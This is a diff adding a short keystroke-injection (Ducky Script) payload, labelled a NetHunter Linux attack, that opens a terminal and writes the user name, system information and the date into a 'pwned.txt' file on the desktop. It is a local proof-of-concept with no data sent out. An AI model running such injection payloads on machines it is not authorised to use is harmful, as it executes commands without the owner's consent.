@@ -1,0 +1,14 @@
+# Linux Recon Payload
+DELAY 1000
+CTRL ALT t
+DELAY 1000
+STRING echo "NetHunter Linux Attack" > ~/Desktop/pwned.txt
+ENTER
+STRING echo "User: $USER" >> ~/Desktop/pwned.txt
+ENTER  
+STRING echo "System: $(uname -a)" >> ~/Desktop/pwned.txt
+ENTER
+STRING echo "Date: $(date)" >> ~/Desktop/pwned.txt
+ENTER
+STRING exit
+ENTER
